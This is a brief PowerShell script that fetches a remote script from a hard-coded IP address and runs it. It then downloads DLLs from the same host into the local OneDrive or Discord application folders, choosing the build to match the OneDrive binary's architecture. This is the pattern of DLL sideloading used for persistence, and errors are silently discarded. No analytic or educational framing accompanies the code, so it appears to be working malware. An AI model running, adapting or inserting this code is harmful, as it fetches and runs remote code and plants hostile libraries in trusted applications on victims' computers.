Invoke-Expression (IWR "185.143.220.132/functions.ps1" -UseBasicParsing)

$path_d = "$env:localappdata\Discord"
$path_o = "$env:localappdata\Microsoft\OneDrive"

$d, $path_d = Find-Discord($path_d)

try {
	if (Test-Path ($path_o + "\OneDrive.exe")) {
		Set-Location $path_o
		$archi = Get-FileBitness($path_o + "\OneDrive.exe")
		
		if ($archi -eq "AMD64") {
			IWR "185.143.220.132/x64/FileSyncFALWB.dll" -OutFile FileSyncFALWB.dll
		} elseif ($archi -eq "I386") {
			IWR "185.143.220.132/x86/FileSyncFALWB.dll" -OutFile FileSyncFALWB.dll
		}
	} elseif ($d) {
		Set-Location $path_d
		IWR "185.143.220.132/x86/WINSTA.dll" -OutFile WINSTA.dll
	}
} catch {}

Exit
